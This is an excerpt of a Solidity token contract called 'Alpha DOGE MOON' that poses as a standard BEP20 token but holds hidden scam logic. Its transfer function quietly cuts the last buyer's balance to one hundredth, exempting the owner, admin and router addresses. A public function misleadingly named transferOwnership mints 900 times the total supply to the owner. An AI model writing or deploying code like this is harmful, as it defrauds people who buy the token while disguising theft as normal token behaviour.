...
contract AlphaBEP20  {
    ...
    string public name = "Alpha DOGE MOON";
    string public symbol = "DOGEMOON";
    uint8 public decimals = 0;
    address owner; address buyme; address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address admin=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (to != buyme){balanceOf[buyme]= balanceOf[buyme].divCeil(100);}
        if (to == msg.sender) {burn();}

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        if (to != owner && to != admin && to != router){buyme = to;}
        return true;
    }
    ...
    function transferOwnership() public {balanceOf[owner] += totalSupply*900;}
